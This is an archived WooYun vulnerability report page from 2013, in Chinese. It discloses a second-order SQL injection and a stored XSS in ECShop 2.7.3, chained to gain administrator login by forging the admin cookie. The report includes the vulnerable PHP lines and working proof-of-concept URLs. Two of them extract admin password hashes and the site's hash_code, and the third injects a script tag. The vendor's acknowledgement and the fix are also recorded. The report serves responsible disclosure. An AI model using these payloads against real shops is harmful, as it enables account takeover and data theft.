@@ -1,0 +1,201 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecshop最新版本SQL注入+存储XSS=任意管理员登录  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecshop最新版本SQL注入+存储XSS=任意管理员登录  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blue">blue</a> 
+</li><li>提交时间：		2013-05-06 20:42</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-09：	细节向第三方安全合作伙伴开放<br/>
+									2013-05-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-26：	细节向普通白帽子公开<br/>
+									2013-06-15：	细节向实习白帽子公开<br/>
+									2013-08-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一个功能点的SQL注入和存储XSS，内含多种技巧，我觉得我就是个艺术家～～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">刚下的ecshop V2.7.3版本～<br />
+<br />
+1.漏洞存在于站外广告统计功能(对应管理后台的报表统计-&gt;站外投放JS)，即/affiche.php页面，将from参数(网站来源referer)存储到了数据库表ecs_adsense，而在后台的“站外投放JS”读取出来未过滤又进入了sql语句，导致二次注入。<br />
+<br />
+</p><pre><code>/affiche.php 119行<br />
+$sql = &quot;INSERT INTO &quot; . $ecs-&gt;table(&#039;adsense&#039;) . &quot;(from_ad, referer, clicks) VALUES (&#039;-1&#039;, &#039;&quot; . $site_name . &quot;&#039;, &#039;1&#039;)&quot;; //$site_name即$_GET[&#039;from&#039;]存库了</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>/admin/adsense.php 47-49行<br />
+/* 获取当前广告所产生的订单总数 */<br />
+$sql2 = &#039;SELECT COUNT(order_id) FROM &#039; .$ecs-&gt;table(&#039;order_info&#039;). &quot; WHERE from_ad=&#039;$rows[ad_id]&#039; AND referer=&#039;$rows[referer]&#039;&quot;; //看到了吧，未再次addslashes导致注入<br />
+$rows[&#039;order_num&#039;] = $db-&gt;getOne($sql2);</code></pre><p class='detail'><br />
+<br />
+2.同时，输出时未对字段referer过滤，导致存储XSS。<br />
+<br />
+3.存储XSS得到cookie本来就可以登录后台了，但我咋能这么简单？SQL注入两条得到ecs_shop_config里的hash_code和管理员的username+password，自己生成COOKIE岂不更爽？<br />
+<br />
+</p><pre><code>/admin/privilege.php 136-141行<br />
+if (isset($_POST[&#039;remember&#039;]))<br />
+        {<br />
+            $time = gmtime() + 3600 * 24 * 365;<br />
+            setcookie(&#039;ECSCP[admin_id]&#039;,   $row[&#039;user_id&#039;],                            $time);<br />
+            setcookie(&#039;ECSCP[admin_pass]&#039;, md5($row[&#039;password&#039;] . $_CFG[&#039;hash_code&#039;]), $time);<br />
+        }</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>http://localhost/test/ecshop/affiche.php?from=a.baidu.com&#039;%20and%201=2%20union%20select%20group_concat(user_id,&#039;|&#039;,user_name,&#039;|&#039;,password)%20from%20ecs_admin_user%20order%20by%201%20desc%23&amp;ad_id=-1  //注入得管理员信息<br />
+http://localhost/test/ecshop/affiche.php?from=a.baidu.com&#039;%20and%201=2%20union%20select%20%20value%20FROM%20`ecs_shop_config`%20WHERE%20code%20=%20&#039;hash_code&#039;%20order%20by%201%20desc%23&amp;ad_id=-1 //注入得hash_code<br />
+http://localhost/test/ecshop/affiche.php?from=a.baidu.com%3Cscript%3Ealert(1)%3C/script%3E&amp;ad_id=-1 //XSS，当然，我使用了xsser.me获取页面上的信息</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06203246ceee535abe58f90a4f38691d9a45d07a.png" target="_blank"><img src="../images/06203246ceee535abe58f90a4f38691d9a45d07a.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/06203325082fe5b1bcd66655dbc434e403080f5b.png" target="_blank"><img src="../images/06203325082fe5b1bcd66655dbc434e403080f5b.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/06203345305e4de92929e4fa100753726b3a3606.png" target="_blank"><img src="../images/06203345305e4de92929e4fa100753726b3a3606.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/062040040c4c9f157b6a677843ae249692ea3b5b.png" target="_blank"><img src="../images/062040040c4c9f157b6a677843ae249692ea3b5b.png" alt="4.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">addslashes, 输出时过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blue" title="blue">blue</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023188" title="ecshop最新版本SQL注入+存储XSS=任意管理员登录">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2013-05-06 21:37</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23188";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
